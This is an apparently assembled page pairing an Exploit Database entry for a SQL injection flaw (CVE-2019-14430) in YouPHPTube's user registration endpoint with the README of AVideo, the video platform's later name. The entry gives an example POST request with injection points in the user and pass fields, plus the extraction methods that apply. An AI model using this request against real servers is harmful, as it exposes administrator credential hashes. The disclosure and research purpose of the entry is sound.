**Vulnerable App:**

```
# Exploit Title: YouPHPTube < 7.3 SQL Injection
# Google Dork: /
# Date: 19.08.2019
# Exploit Author: Fabian Mosch, r-tec IT Security GmbH
# Vendor Homepage: https://www.youphptube.com/
# Software Link: https://github.com/YouPHPTube/YouPHPTube
# Version: < 7.3
# Tested on: Linux/Windows
# CVE : CVE-2019-14430

The parameters "User" as well as "pass" of the user registration function are vulnerable to SQL injection vulnerabilities. By submitting an HTTP POST request to the URL "/objects/userCreate.json.php" an attacker can access the database and read the hashed credentials of an administrator for example.

Example Request:

POST /objects/userCreate.json.php HTTP/1.1
Host: vulnerablehost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
[SomeHeaders and Cookies]

user=tes'INJECTHERE&pass=test'INJECTHERE &email=test%40example.com&name=test&captcha=xxxxx

Methods for DB-Extraction are:

- Boolean-based blind

- Error-based

- AND/OR time-based blind

The vulnerability was fixed with this commit:
https://github.com/YouPHPTube/YouPHPTube/commit/891843d547f7db5639925a67b7f2fd66721f703a

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# First thing...

I thank God for graciously, through His mercy, giving me all the necessary knowledge acquired throughout my life and throughout the development of this project. It is only through His grace and provision that this was possible, and I am truly grateful for His presence every step of the way.

> **For of Him, and through Him, and to Him, are all things: to whom be glory forever. Amen.**
> `Apostle Paul in Romans 11:36`

## Your Comprehensive Video Streaming Solution

At AVideo, we provide more than just a platform; we offer a comprehensive solution for hosting, managing, monetizing, and expanding your video content. Embrace the future of video streaming and unlock the full potential of your content with AVideo.

# 📚 How AVideo is Organized

AVideo is a comprehensive platform, divided into three key components:

* **Streamer**: The core component for playing and managing videos. It acts as the main interface for users to interact with video content.
* **Encoder**: This tool converts your videos into a web-compatible format, ensuring they are ready for streaming on various devices and platforms.
* **Live Server**: Specifically designed for broadcasting live videos, this component is essential for real-time streaming capabilities.

## 🔍 Why Do I Need the Encoder?

Installing your own encoder can be beneficial for several reasons:

* **Faster Performance**: Having your own encoder might provide faster processing compared to using a public encoder server.
* **Privacy**: If privacy in video processing is a concern, a private encoder ensures that your content remains confidential.
* **Network Compatibility**: In cases where your server is on a private network without a public IP address or uses an IP within specific ranges (10.0.0.0/8, 127.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), having your own encoder is essential for proper communication with the streamer site.

## 📜 Agreement on the Purpose of Software Installation

AVideo is dedicated to promoting positive and ethical content creation. As such, we firmly stipulate that:

* This Software must be used for Good, never for Evil.
* The creation of content related to sexually explicit material, pornography, or adult themes using this software is strictly prohibited.

# Crucial Advisory: Strictly Avoid Using Control Panels for Installation

**Important**: For the installation of the Streamer, Encoder, and Livestream components, it is imperative to use a Linux distribution, specifically Ubuntu, **without any type of control panel**. This includes avoiding panels like cPanel, Plesk, Webmin, VestaCP, and similar.

Control panels significantly interfere with the necessary system access and processes required for a successful installation. They restrict the installation of essential libraries and the compilation of critical software, such as Nginx for the Livestream component.

**Please be advised**: Installing our system on a server with any control panel is highly discouraged and is likely to result in installation failure. We cannot provide support or guarantee success in such scenarios. For a smooth and functional installation, it is essential to follow this guideline strictly.
